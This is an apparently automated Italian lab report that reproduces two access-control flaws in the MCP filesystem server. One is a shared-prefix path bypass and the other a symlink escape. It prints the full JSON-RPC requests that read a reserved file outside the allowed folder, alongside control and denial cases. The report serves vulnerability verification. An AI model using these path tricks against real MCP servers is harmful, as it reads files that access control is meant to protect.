# filesystem, configurazione vulnerabile

Esecuzione del 2026-11-24 11:19:36 UTC. Completata.
Docker 29.9.3, Compose 5.7.0, commit git: 5f4e67a, nessuna modifica non salvata.

Controllo degli accessi nel server @modelcontextprotocol/server-filesystem (CVE-2025-53110 e CVE-2025-53109): versione 2025.3.28 contro 2025.7.1. Il server ha una sola cartella consentita, /dati/area_consentita, e un client MCP su stdio chiama read_file su percorsi diversi. Il client salva nel volume /prove il testo ricevuto, anche quando la risposta è un errore, e l'esito dipende dal marcatore che vi compare. Con stdio non c'è traffico di rete da catturare, e lo scambio JSON-RPC completo è in risultati.jsonl.

**Casi conformi all'atteso: 4/4**

## Esiti

| Caso | Tipo | Esito | Atteso | Conforme |
|---|---|---|---|---|
| controllo_lettura_consentita | controllo | letto_consentito | letto_consentito | sì |
| limite_percorso_esterno | limite | negato | negato | sì |
| attacco_prefisso | attacco | esfiltrato | esfiltrato | sì |
| attacco_collegamento_simbolico | attacco | esfiltrato | esfiltrato | sì |

Conforme: l'esito osservato coincide con quello atteso per questa configurazione (con la versione vulnerabile, per i casi di attacco l'atteso è che riescano).

## Casi

### controllo_lettura_consentita (controllo)

Lettura di un file dentro la cartella consentita. Deve funzionare in entrambe le versioni.

Output del client:

```
cartella consentita del server: /dati/area_consentita
percorso richiesto a read_file:  /dati/area_consentita/documento.txt
>> {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"client-laboratorio","version":"1.0"}}}
<< {"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"secure-filesystem-server","version":"0.2.0"}},"jsonrpc":"2.0","id":1}
>> {"jsonrpc":"2.0","method":"notifications/initialized"}
>> {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/dati/area_consentita/documento.txt"}}}
<< {"result":{"content":[{"type":"text","text":"documento di lavoro. MARCATORE_CONSENTITO_7f3a\n"}]},"jsonrpc":"2.0","id":2}
[stderr del server]
Secure MCP Filesystem Server running on stdio
Allowed directories: [ '/dati/area_consentita' ]
fine
```

Verifica sul container: `letto_consentito`

Esito: **letto_consentito**, atteso: letto_consentito

### limite_percorso_esterno (limite)

Lettura richiesta con un percorso assoluto che punta a una cartella fuori da quella consentita. Deve essere negata in entrambe le versioni.

Output del client:

```
cartella consentita del server: /dati/area_consentita
percorso richiesto a read_file:  /dati/area_riservata/segreto.txt
>> {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"client-laboratorio","version":"1.0"}}}
<< {"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"secure-filesystem-server","version":"0.2.0"}},"jsonrpc":"2.0","id":1}
>> {"jsonrpc":"2.0","method":"notifications/initialized"}
>> {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/dati/area_riservata/segreto.txt"}}}
<< {"result":{"content":[{"type":"text","text":"Error: Access denied - path outside allowed directories: /dati/area_riservata/segreto.txt not in /dati/area_consentita"}],"isError":true},"jsonrpc":"2.0","id":2}
[stderr del server]
Secure MCP Filesystem Server running on stdio
Allowed directories: [ '/dati/area_consentita' ]
fine
```

Verifica sul container: `negato`

Esito: **negato**, atteso: negato

### attacco_prefisso (attacco)

CVE-2025-53110: percorso che condivide il prefisso stringa della cartella consentita ma è fuori dai limiti. Con la 2025.3.28 il contenuto riservato viene esfiltrato; con la 2025.7.1 l'accesso è negato.

Output del client:

```
cartella consentita del server: /dati/area_consentita
percorso richiesto a read_file:  /dati/area_consentita_riservata/segreto.txt
>> {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"client-laboratorio","version":"1.0"}}}
<< {"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"secure-filesystem-server","version":"0.2.0"}},"jsonrpc":"2.0","id":1}
>> {"jsonrpc":"2.0","method":"notifications/initialized"}
>> {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/dati/area_consentita_riservata/segreto.txt"}}}
<< {"result":{"content":[{"type":"text","text":"dati sensibili fuori dalla cartella consentita. MARCATORE_RISERVATO_9b21\n"}]},"jsonrpc":"2.0","id":2}
[stderr del server]
Secure MCP Filesystem Server running on stdio
Allowed directories: [ '/dati/area_consentita' ]
fine
```

Verifica sul container: `esfiltrato`

Esito: **esfiltrato**, atteso: esfiltrato

### attacco_collegamento_simbolico (attacco)

CVE-2025-53109: collegamento simbolico dentro la cartella consentita che punta al file riservato. Con la 2025.3.28 il server segue il link; con la 2025.7.1 l'accesso è negato.

Output del client:

```
cartella consentita del server: /dati/area_consentita
percorso richiesto a read_file:  /dati/area_consentita/link_segreto
>> {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"client-laboratorio","version":"1.0"}}}
<< {"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"secure-filesystem-server","version":"0.2.0"}},"jsonrpc":"2.0","id":1}
>> {"jsonrpc":"2.0","method":"notifications/initialized"}
>> {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/dati/area_consentita/link_segreto"}}}
<< {"result":{"content":[{"type":"text","text":"dati sensibili fuori dalla cartella consentita. MARCATORE_RISERVATO_9b21\n"}]},"jsonrpc":"2.0","id":2}
[stderr del server]
Secure MCP Filesystem Server running on stdio
Allowed directories: [ '/dati/area_consentita' ]
fine
```

Verifica sul container: `esfiltrato`

Esito: **esfiltrato**, atteso: esfiltrato

## Altri file di questa cartella

- `container.log`: log dei container con timestamp, una sezione per avvio
- `pcap/`: traffico di rete del servizio sotto test (Wireshark), vuoto se il server usa stdio
- `risultati.jsonl`: output completo di ogni caso e ripetizione, per i programmi
- `meta.json`, `immagini.json`, `immagini_base.json`, `pacchetti.txt`, `comandi.log`, `scenario/`: versioni, digest, comandi e file usati
